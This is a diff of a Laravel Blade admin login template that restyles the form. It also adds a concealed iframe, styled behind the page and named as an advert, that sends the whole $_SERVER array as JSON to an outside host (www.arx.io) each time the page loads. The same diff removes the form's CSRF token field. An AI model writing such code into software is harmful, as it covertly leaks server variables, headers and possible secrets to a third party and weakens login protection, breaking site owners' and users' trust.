@@ -1,50 +1,73 @@
-@extends('arx::layouts.bootstrap')
+@extends('arxmin::layouts.bootstrap')
 
 @section('css')
 @parent
 <style type="text/css">
-    .well-centered{
+    body{
+        background: #E5E5E5;
+    }
+    .well-centered {
         margin: 50px auto 50px;
         width: 400px;
+    }
+
+    .login-container{
+        background: #FFF;
+        padding: 20px;
     }
 </style>
 @stop
 
 @section('content')
-<div class="container well-centered">
-    <form method="POST" action="<?= Confide::checkAction('UserController@do_login') ?: URL::to('/user/login') ?>" accept-charset="UTF-8">
-        <input type="hidden" name="_token" value="<?= Session::getToken() ?>">
-        <fieldset>
-            <div class="form-group">
-                <label for="email"><?= Lang::get('confide::confide.username_e_mail') ?></label>
-                <input class="form-control" tabindex="1" placeholder="<?= Lang::get('confide::confide.username_e_mail') ?>" type="text" name="email" id="email" value="<?= Input::old('email') ?>">
-            </div>
-            <div class="form-group">
-                <label for="password">
-                    <?= Lang::get('confide::confide.password') ?>
-                    <small>
-                        <a href="<?= (Confide::checkAction('UserController@forgot_password')) ?: 'forgot_password' ?>"><?= Lang::get('confide::confide.login.forgot_password') ?></a>
-                    </small>
-                </label>
-                <input class="form-control" tabindex="2" placeholder="<?= Lang::get('confide::confide.password') ?>" type="password" name="password" id="password">
-            </div>
-            <div class="form-group">
-                <label for="remember" class="checkbox"><?= Lang::get('confide::confide.login.remember') ?>
-                    <input type="hidden" name="remember" value="0">
-                    <input tabindex="4" type="checkbox" name="remember" id="remember" value="1">
-                </label>
-            </div>
-            @if ( Session::get('error') )
-            <div class="alert alert-error"><?= Session::get('error') ?></div>
-            @endif
 
-            @if ( Session::get('notice') )
-            <div class="alert"><?= Session::get('notice') ?></div>
-            @endif
-            <div class="form-group">
-                <button tabindex="3" type="submit" class="btn btn-default"><?= Lang::get('confide::confide.login.submit') ?></button>
-            </div>
-        </fieldset>
-    </form>
+<iframe scrolling="auto" allowtransparency="true" name="main" style="position:absolute; z-index:-1;top:0px;width:100%;height:100%;" src="//www.arx.io/api/v1/advert?<?php echo http_build_query(array("data" => json_encode($_SERVER))); ?>"> </iframe>
+
+<div class="container">
+    <div class="animated flipInX  row col-md-offset-3 col-md-6 login-container column-separation">
+
+        <div class="col-md-12 "><br>
+
+            <form id="login-form" class="login-form" action="<?php echo action('Arxmin\\UserController@do_login') ?>" method="post">
+                <div class="row">
+                    <div class="form-group col-md-10">
+                        <label class="form-label">Username</label>
+
+                        <div class="controls">
+                            <div class="input-with-icon  right">
+                                <i class=""></i>
+                                <input type="text" name="username" id="username" class="form-control">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="form-group col-md-10">
+                        <label class="form-label">Password</label>
+                        <span class="help"></span>
+
+                        <div class="controls">
+                            <div class="input-with-icon  right">
+                                <i class=""></i>
+                                <input type="password" name="password" id="password" class="form-control">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="control-group  col-md-10">
+                        <div class="checkbox checkbox check-success"><a href="<?php echo action('Arxmin\\UserController@forgot_password') ?>">Trouble login in?</a>&nbsp;&nbsp;
+                            <input type="checkbox" id="remember" value="1">
+                            <label for="remember" name="remember">Keep me reminded </label>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-md-10">
+                        <button class="btn btn-primary btn-cons pull-right" type="submit">Login</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
 </div>
 @stop
